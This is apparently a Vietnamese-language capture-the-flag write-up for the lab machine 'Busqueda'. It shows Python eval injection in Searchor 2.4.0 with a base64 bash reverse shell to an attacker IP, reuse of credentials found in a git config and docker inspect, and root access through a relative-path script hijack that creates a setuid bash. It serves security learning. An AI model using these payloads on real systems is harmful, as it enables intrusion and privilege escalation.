![[Pasted image 20261124004245.png]]

# Attack Vector

svc:  Nmap -> web enumeration -> searchor 2.4.0 -> python code injection với eval function -> RCE -> shell 
root: System enumeration -> git repository -> credentials as cody -> reuse password -> sudo misconfiguration -> docker Enumeration -> administrator credentials in gitea -> source code -> **Relative Path Hijacking / Unsafe Relative Path Execution** -> create fake file -> root.

# Nmap 

```
┌─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $nmap -sC -sV 10.129.228.217  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-23 23:21 +07  
Nmap scan report for 10.129.228.217  
Host is up (0.047s latency).  
Not shown: 998 closed tcp ports (conn-refused)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)  
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)  
80/tcp open  http    Apache httpd 2.4.52  
|_http-title: Did not follow redirect to http://searcher.htb/  
|_http-server-header: Apache/2.4.52 (Ubuntu)  
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Nhận xét:
	- cổng 22 chạy ssh, các thông tin bên ngoài cho thấy máy này chạy ubuntu
	- cổng  80 đang chạy Apache web server 


# Web Enumeration

khi tôi vào trang web searchor.htb chúng ta có thể thấy trang web này đang chạy searchor v2.4.0. Searchor là 1 thư viện python search-engine bị lỗ hổng **CVE-2023-43364** cho phép ta tiêm mã python độc vào từ đó lấy được shell của back-end server.
```python
url = eval(f"Engine.{engine}.search('{query}', ...)")
```

cụ thể chúng ta chỉ cần tiêm vào query lệnh python sao cho nó escape được cái query và thực thi mã lệnh là xong

```python
url = eval(
Engine.<some_engine>.search('') + str(__import__('os').system('id')) #', copy_url=
{copy}, open_web={open})"
)
```

# shell as svc
khi đó ta sẽ có thể tiêm reverse shell vào được


```bash
┌─[_]─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $echo "YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTU0LzEyMzQgMD4mMQ==" | base64 -d  
bash -i  >& /dev/tcp/10.10.14.154/1234 0>&1┌─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $
```




tiêm vào query 
```python

')+ str(__import__('os').system('echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTU0LzEyMzQgMD4mMQ== | base64 -d | bash '))#

```


```bash
└──_ $nc -vlnp 1234  
Listening on 0.0.0.0 1234  
Connection received on 10.129.228.217 49058  
bash: cannot set terminal process group (1607): Inappropriate ioctl for device  
bash: no job control in this shell  
svc@busqueda:/var/www/app$
```

ta đã có được shell



# shell as root

file .gitconfig
```
svc@busqueda:~$ cat .gitconfig  
[user]  
       email = cody@searcher.htb  
       name = cody  
[core]  
       hooksPath = no-hooks  
svc@busqueda:~$
```

nó cho ta gợi ý về user cody có thể có repository git trên hệ thống này


```
find / -name .git 2>/dev/null  
/var/www/app/.git  
/opt/scripts/.git


```


tôi tìm thấy tận 2 file .git

ta hãy bắt đầu với /var/www/app/.git

```
svc@busqueda:/var/www/app/.git$ cat config  
[core]  
       repositoryformatversion = 0  
       filemode = true  
       bare = false  
       logallrefupdates = true  
[remote "origin"]  
       url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git  
       fetch = +refs/heads/*:refs/remotes/origin/*  
[branch "main"]  
       remote = origin  
       merge = refs/heads/main  
svc@busqueda:/var/www/app/.git$
```

ta có credential của cody: cody:jh1usoih2bkjaspwe92 và có vẻ như có thêm app gitea đang chạy trên này.

Chúng ta thử lại sudo -l với password trên chúng ta thấy được rằng 
```
svc@busqueda:/var/www/app/.git$ sudo -l  
[sudo] password for svc:  
Matching Defaults entries for svc on busqueda:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,  
   use_pty  
  
User svc may run the following commands on busqueda:  
   (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

chúng ta có 1  sudoers misconfiguration cho phép ta chạy script python trên


khi ta config lại host và vào thì chúng ta được dẫn đến 1 chương trình gitea đang chạy trên trang này
http://gitea.searcher.htb/

Enumerate 1 chút với docker-ps ta thấy 2 container đang chạy
```
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py a  
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)  
  
    docker-ps     : List running docker containers  
    docker-inspect : Inpect a certain docker container  
    full-checkup  : Run a full system checkup  
  
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps  
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS          PORTS                                             NAMES  
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint_"   3 years ago   Up 56 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea  
f84a6b33fb5a   mysql:8              "docker-entrypoint.s_"   3 years ago   Up 56 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db  
  
svc@busqueda:/var/www/app/.git$
```

- gittea
- mysql
khi tôi inspect docker tôi thấy 1 dòng mật khẩu khá đáng ngờ
```
"Tty": false,  
   "OpenStdin": false,  
   "StdinOnce": false,  
   "Env": [  
     "USER_UID=115",  
     "USER_GID=121",  
     "GITEA__database__DB_TYPE=mysql",  
     "GITEA__database__HOST=db:3306",  
     "GITEA__database__NAME=gitea",  
     "GITEA__database__USER=gitea",  
     "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",  
     "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",  
     "USER=git",  
     "GITEA_CUSTOM=/data/gitea"  
   ],  
   "Cmd": [
```


có vẻ gitea có 1 mật khẩu yuiu1hoiu4i5ho1uh có vẻ là cho administrator

chúng ta có được toàn bộ file mã nguồn của các lệnh sudo trên thông qua đăng nhập gitea
```bash
#!/bin/bash
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            

if __name__ == '__main__':

    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)

```



dựa vào đoạn code trên ta thấy options full-checkup đáng chú ý nhất khi mà nó thực thi full-checkup.sh trên current directory của user svc =))

từ đó ta có thể viết 1 file full-checkup.sh giả chứa mã độc và thực thi nó dưới quyền root từ đó ta sẽ có root shell

```bash
svc@busqueda:/tmp$ nano full-checkup.sh  
svc@busqueda:/tmp$ cat full-checkup.sh  
#!/bin/bash  
  
cp /bin/bash /tmp/pwn  
chmod u+s /tmp/pwn  
svc@busqueda:/tmp$ chmod 777 full-checkup.sh  
svc@busqueda:/tmp$ sudo -l  
Matching Defaults entries for svc on busqueda:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,  
   use_pty  
  
User svc may run the following commands on busqueda:  
   (root) /usr/bin/python3 /opt/scripts/system-checkup.py *  
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup  
  
[+] Done!  
svc@busqueda:/tmp$ ls pwn  
pwn  
svc@busqueda:/tmp$ ./pwn -p  
pwn-5.1# whoami; id; hostname  
root  
uid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)  
busqueda  
pwn-5.1#
```


